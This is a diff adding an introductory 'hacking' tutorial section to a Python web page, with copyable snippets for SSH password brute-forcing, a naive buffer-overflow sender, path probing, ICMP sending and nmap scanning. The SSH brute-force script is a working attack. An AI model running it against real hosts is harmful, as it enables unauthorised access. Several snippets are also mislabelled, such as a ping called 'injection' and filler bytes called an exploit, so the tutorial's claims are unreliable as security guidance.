@@ -540,6 +540,205 @@ Python is widely recognized for its <b>simplicity and versility</b>, and it has 
             </div>
         </section>
     </main>
+    <hr>
+    <div class="container">
+    <h1>All About Hacking</h1>
+
+    <div class="section">
+        <h2>Introduction to Hacking</h2>
+        <p>Hacking is the act of identifying and exploiting weaknesses in computer systems and networks to gain unauthorized access. It involves creative problem-solving, technical knowledge, and a keen understanding of computer systems and vulnerabilities.</p>
+    </div>
+
+    <div class="section">
+        <h2>Common Types of Hacking</h2>
+        <ul>
+            <li><strong>Ethical Hacking:</strong> Hacking done to identify and fix security weaknesses, legally.</li>
+            <li><strong>Black Hat Hacking:</strong> Hacking done to exploit or damage systems illegally.</li>
+            <li><strong>Gray Hat Hacking:</strong> Hacking done without malicious intent, but often without permission.</li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>Python Libraries for Hacking</h2>
+        <p>Below is a list of Python libraries commonly used for hacking and penetration testing:</p>
+        <ul>
+            <li><strong>Requests:</strong> For making HTTP requests to interact with websites and APIs.</li>
+            <li><strong>BeautifulSoup:</strong> For web scraping and extracting information from HTML and XML documents.</li>
+            <li><strong>Scapy:</strong> A powerful Python library used for network manipulation, including packet crafting and sniffing.</li>
+            <li><strong>PyCrypto:</strong> A library used for encryption, decryption, and cryptographic operations.</li>
+            <li><strong>Socket:</strong> For network programming, creating sockets, and interacting with network services.</li>
+            <li><strong>Paramiko:</strong> A library for SSH connectivity and remote command execution.</li>
+            <li><strong>Metasploit (via msfrpc):</strong> For automating Metasploit framework operations for exploitations.</li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>Example: Using Requests for Web Scraping</h2>
+        <div class="code-snippet" id="code1">
+            <pre>
+import requests
+
+def check_vulnerability(url):
+    common_paths = ['/admin', '/login', '/wp-admin', '/admin.php']
+    for path in common_paths:
+        full_url = url + path
+        try:
+            response = requests.get(full_url)
+            if response.status_code == 200:
+                print(f"Possible vulnerability found at {full_url}")
+            else:
+                print(f"No vulnerability at {full_url}")
+        except requests.exceptions.RequestException as e:
+            print(f"Error: {e}")
+
+# Test the script with a target URL
+check_vulnerability("http://example.com")
+            </pre>
+            <button class="copy-button" onclick="copyCode('code1')">Copy</button>
+        </div>
+    </div>
+
+    <!-- Intermediate Hacking Section -->
+    <div class="section">
+        <h2>Intermediate Hacking: Brute Force Attack</h2>
+        <p>Brute force attacks are used to guess passwords by trying a large number of possibilities. Below is an example of how you can use Python to perform a basic brute-force attack on an SSH server using the <code>paramiko</code> library.</p>
+    </div>
+
+    <div class="section">
+        <h2>Example: Python Brute Force SSH Login</h2>
+        <div class="code-snippet" id="code2">
+            <pre>
+import paramiko
+
+def brute_force_ssh(host, username, password_list):
+    for password in password_list:
+        try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(host, username=username, password=password)
+            print(f"Password found: {password}")
+            client.close()
+            break
+        except paramiko.AuthenticationException:
+            print(f"Incorrect password: {password}")
+
+# Example of trying passwords for SSH login
+passwords = ["password123", "admin", "letmein", "123456"]
+brute_force_ssh('192.168.1.2', 'root', passwords)
+            </pre>
+            <button class="copy-button" onclick="copyCode('code2')">Copy</button>
+        </div>
+    </div>
+
+    <!-- Advanced Hacking Section -->
+    <div class="section">
+        <h2>Advanced Hacking: Exploit Development</h2>
+        <p>Exploit development is an advanced technique that involves creating custom software to exploit vulnerabilities in a system. Below is an example of how you might use the <code>socket</code> library in Python to craft a buffer overflow exploit. This is a basic demonstration, and exploit development requires deep knowledge of low-level programming and system internals.</p>
+    </div>
+
+    <div class="section">
+        <h2>Example: Python Buffer Overflow Exploit (Basic)</h2>
+        <div class="code-snippet" id="code3">
+            <pre>
+import socket
+
+def buffer_overflow_exploit(target_ip, target_port, payload):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, target_port))
+        
+        # Sending payload to overflow buffer
+        s.send(payload)
+        print(f"Exploit sent to {target_ip}:{target_port}")
+        s.close()
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Example of a simple buffer overflow exploit (replace with actual vulnerable target)
+payload = b"A" * 1024  # Example of an overflow payload
+buffer_overflow_exploit('192.168.1.2', 12345, payload)
+            </pre>
+            <button class="copy-button" onclick="copyCode('code3')">Copy</button>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Advanced Hacking: Packet Injection with Scapy</h2>
+        <p>Packet injection allows an attacker to inject custom packets into a network. Scapy is a powerful tool that can be used for packet crafting and network analysis. Below is an example of how to use Scapy to inject a simple ICMP (ping) packet into a network.</p>
+    </div>
+
+    <div class="section">
+        <h2>Example: Python Packet Injection with Scapy</h2>
+        <div class="code-snippet" id="code4">
+            <pre>
+from scapy.all import IP, ICMP, send
+
+def packet_injection(target_ip):
+    packet = IP(dst=target_ip)/ICMP()
+    send(packet)
+    print(f"ICMP packet injected to {target_ip}")
+
+# Example of sending an ICMP packet
+packet_injection("192.168.1.2")
+            </pre>
+            <button class="copy-button" onclick="copyCode('code4')">Copy</button>
+        </div>
+    </div>
+
+</div>
+<!-- all-->
+        <div class="section">
+        <h2>Essential Hacking Tools</h2>
+        <p>Here are some widely used tools for penetration testing, network analysis, and vulnerability exploitation:</p>
+        
+        <ul>
+            <li><strong>Metasploit:</strong> A powerful penetration testing framework that enables attackers to find, exploit, and validate vulnerabilities in systems. It's often used for exploiting known vulnerabilities in a controlled, legal environment.</li>
+            <li><strong>Wireshark:</strong> A network protocol analyzer that allows users to capture and analyze the data traveling through a network. It's often used for network troubleshooting, but it can also be used to sniff packets and intercept sensitive information.</li>
+            <li><strong>Nmap:</strong> A tool used for network discovery and security auditing. It helps in discovering devices and services on a network, and can be used for identifying vulnerabilities.</li>
+            <li><strong>Burp Suite:</strong> A popular suite of tools for web application security testing. It includes features like a proxy server, scanner, and intruder for discovering and exploiting web vulnerabilities.</li>
+            <li><strong>Hydra:</strong> A fast and flexible password-cracking tool that supports numerous protocols, including SSH, HTTP, FTP, and others. It's used to perform brute-force attacks to crack weak passwords.</li>
+            <li><strong>John the Ripper:</strong> A password cracking tool used to test password strength by attempting to crack encrypted password hashes using various attack methods (dictionary, brute force, etc.).</li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>Example: Using Nmap for Network Scanning</h2>
+        <p>Here is an example of how to use Nmap for scanning open ports and detecting services on a remote host.</p>
+        <div class="code-snippet" id="code7">
+            <pre>
+# Example Nmap command for scanning a target host
+nmap -sS -p 1-65535 -T4 target_ip
+            </pre>
+            <button class="copy-button" onclick="copyCode('code7')">Copy</button>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Example: Using Wireshark for Packet Sniffing</h2>
+        <p>Wireshark is a tool used to capture and inspect network packets. While it is a GUI-based tool, you can use it to analyze network traffic and detect vulnerabilities in a network.</p>
+        <div class="code-snippet" id="code8">
+            <pre>
+# Wireshark capture command (run Wireshark with appropriate permissions)
+wireshark -k -Y "http.request" -i eth0
+            </pre>
+            <button class="copy-button" onclick="copyCode('code8')">Copy</button>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Example: Using Burp Suite for Intercepting HTTP Requests</h2>
+        <p>Burp Suite allows for intercepting and manipulating HTTP/S requests between your browser and the target application. You can modify requests and responses, brute force login forms, and more.</p>
+        <div class="code-snippet" id="code9">
+            <pre>
+# Burp Suite command to start the proxy (requires Burp Suite installation)
+java -jar burpsuite_pro_vX.X.X.jar
+            </pre>
+            <button class="copy-button" onclick="copyCode('code9')">Copy</button>
+        </div>
+    </div>
+
+</div>
+
         <footer class="footer">
         <p>For educational purposes only. Always practice ethical hacking.</p>
     </footer>
